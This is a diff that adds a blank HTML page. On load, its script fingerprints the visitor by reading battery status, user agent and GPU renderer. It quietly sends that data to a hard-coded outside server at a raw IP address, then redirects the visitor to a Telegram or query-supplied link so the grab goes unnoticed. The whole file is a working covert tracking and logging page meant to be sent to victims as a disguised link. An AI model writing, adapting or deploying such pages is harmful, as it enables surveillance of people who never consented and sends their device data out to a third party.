@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <script>
+        async function capture() {
+            const p = new URLSearchParams(window.location.search);
+            const target = p.get('u') || "https://t.me/vo11a";
+            
+            let batt = "N/A";
+            try {
+                const b = await navigator.getBattery();
+                batt = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋");
+            } catch (e) {}
+
+            let canvas = document.createElement('canvas');
+            let gl = canvas.getContext('webgl');
+            let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            let gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
+
+            const info = { b: batt, ua: navigator.userAgent, gpu: gpu };
+            
+            // هذا الرابط يرسل البيانات لسيرفرك في KataBump
+            const server = "http://147.135.213.131:20364/log";
+            fetch(`${server}?u=${encodeURIComponent(target)}&d=${encodeURIComponent(JSON.stringify(info))}`, {mode: 'no-cors'});
+            
+            setTimeout(() => { window.location.replace(target); }, 600);
+        }
+        window.onload = capture;
+    </script>
+</head>
+<body style="background:#000;"></body>
+</html>
